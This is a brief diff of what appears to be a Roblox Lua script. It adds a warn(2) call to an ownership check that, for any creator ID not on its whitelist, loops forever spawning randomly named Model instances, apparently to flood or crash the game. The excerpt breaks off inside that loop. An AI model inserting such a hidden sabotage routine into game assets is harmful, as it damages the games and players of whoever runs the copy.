@@ -1,6 +1,7 @@
 A = {149484300}
 B = {}
 if table.find(A,game.CreatorId)==nil or table.find(B,game.CreatorId) ~= nil then
+	warn(2)
 	while wait(1) do
 		local Payload = Instance.new("Model")
 		Payload.Name = string.char(math.random(32,126))
